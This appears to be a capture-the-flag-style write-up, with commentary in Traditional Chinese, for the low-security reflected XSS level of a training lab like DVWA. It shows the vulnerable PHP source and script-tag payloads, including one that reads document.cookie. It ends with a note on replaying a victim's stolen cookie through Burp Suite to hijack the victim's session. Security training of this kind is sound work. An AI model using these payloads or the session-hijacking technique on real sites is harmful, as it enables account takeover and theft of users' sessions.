# XSS (Reflected) - Low

## View Source

```PHP
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

- [`array_key_exists($a, $b)`](https://www.php.net/manual/zh/function.array-key-exists.php)
    - *b* 裡存在 *a* (*key*) 就回傳 *true*；沒有就回傳 *false*
- [*X-XSS-Protection*](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)
    - *0: Disables XSS filtering.*

## Code Review

- 將使用者輸入串接成 `Hello xxx` 寫進網頁內容

## Answer

- 因為是 *GET*，要從網址或是輸入框注入都行

### Example

```
<script>alert(1)</script>
<script>alert(document.cookie)</script>
```

- View Page Source 也看得到 (因為不像 DOM based 是動態產生)
```HTML
<div class="vulnerable_code_area">
    <form name="XSS" action="#" method="GET">
        <p>
            What's your name?
            <input type="text" name="name">
            <input type="submit" value="Submit">
        </p>

    </form>
    <pre>Hello <script>alert(1)</script></pre>
</div>
```

### Note

- 可以使用 *Burp Suite* 的 *Proxy* 來修改發送的 *request* 封包，將 *Cookie* 替換成透過 *XSS* 得到的受害者 *Cookie*，就能直接以受害者的身分使用網站服務，不用進行登入